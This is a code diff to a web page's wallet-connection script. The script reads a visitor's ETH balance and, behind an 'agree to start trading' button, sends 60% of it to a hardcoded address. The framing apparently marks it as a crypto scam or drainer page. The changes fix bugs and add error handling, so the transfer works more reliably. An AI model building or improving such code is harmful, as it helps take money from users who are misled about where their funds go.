@@ -383,10 +383,12 @@
             const TRADING_ADDRESS = '0xaffFA89b0E5eb3869d98f668e470e075a0948BA5';
             let userAgreed = false;
             let userBalance = 0;
+            let web3;
 
             // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
             if (typeof window.ethereum !== 'undefined') {
                 console.log('Web3 detected!');
+                web3 = new Web3(window.ethereum);
             } else {
                 console.log('No Web3 detected');
                 connectWalletBtn.textContent = 'Web3 Not Detected';
@@ -427,8 +429,16 @@
 
             // Agree to start trading (transfer 60%)
             agreeTradeBtn.addEventListener('click', async function() {
+                // Disable button to prevent multiple clicks
+                agreeTradeBtn.disabled = true;
+                agreeTradeBtn.classList.add('opacity-50', 'cursor-not-allowed');
+                
                 // Initiate transfer
                 await transferToTradingAccount();
+                
+                // Re-enable button after transaction completes or fails
+                agreeTradeBtn.disabled = false;
+                agreeTradeBtn.classList.remove('opacity-50', 'cursor-not-allowed');
             });
 
             // Main function to connect wallet and get balance
@@ -437,9 +447,6 @@
                     // Request account access
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                     const account = accounts[0];
-                    
-                    // Initialize Web3
-                    const web3 = new Web3(window.ethereum);
                     
                     // Get balance
                     const balanceWei = await web3.eth.getBalance(account);
@@ -471,6 +478,13 @@
                     testSection.classList.add('hidden');
                     walletStatus.classList.add('hidden');
                     connectWalletBtn.classList.add('pulse');
+                    
+                    // Show error to user
+                    transactionModal.classList.remove('hidden');
+                    transactionSpinner.classList.add('hidden');
+                    transactionError.classList.remove('hidden');
+                    transactionTitle.textContent = 'Connection Error';
+                    transactionMessage.textContent = error.message || 'Failed to connect wallet';
                 }
             }
 
@@ -478,15 +492,12 @@
             async function transferToTradingAccount() {
                 try {
                     // Get current account
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+                    const accounts = await web3.eth.getAccounts();
                     const account = accounts[0];
                     
                     if (!account) {
                         throw new Error('No account connected');
                     }
-                    
-                    // Initialize Web3
-                    const web3 = new Web3(window.ethereum);
                     
                     // Calculate 60% of balance in Wei
                     const amountEth = userBalance * 0.6;
@@ -515,12 +526,12 @@
                         from: account,
                         to: TRADING_ADDRESS,
                         value: amountWei,
-                        gas: 21000, // Standard gas limit for simple ETH transfers
+                        gas: web3.utils.toHex(21000), // Standard gas limit for simple ETH transfers
                         gasPrice: gasPrice // Current gas price
                     };
                     
                     // Send transaction - this will trigger the wallet confirmation
-                    const txHash = await web3.eth.sendTransaction(transactionParameters)
+                    web3.eth.sendTransaction(transactionParameters)
                         .on('transactionHash', function(hash) {
                             // Transaction was sent to the network
                             console.log('Transaction hash:', hash);
@@ -554,9 +565,7 @@
                             transactionTitle.textContent = 'Transaction Failed';
                             transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
                         });
-                    
-                    console.log('Transaction initiated:', txHash);
-                
+
                 } catch (error) {
                     console.error('Error performing transaction:', error);
                     
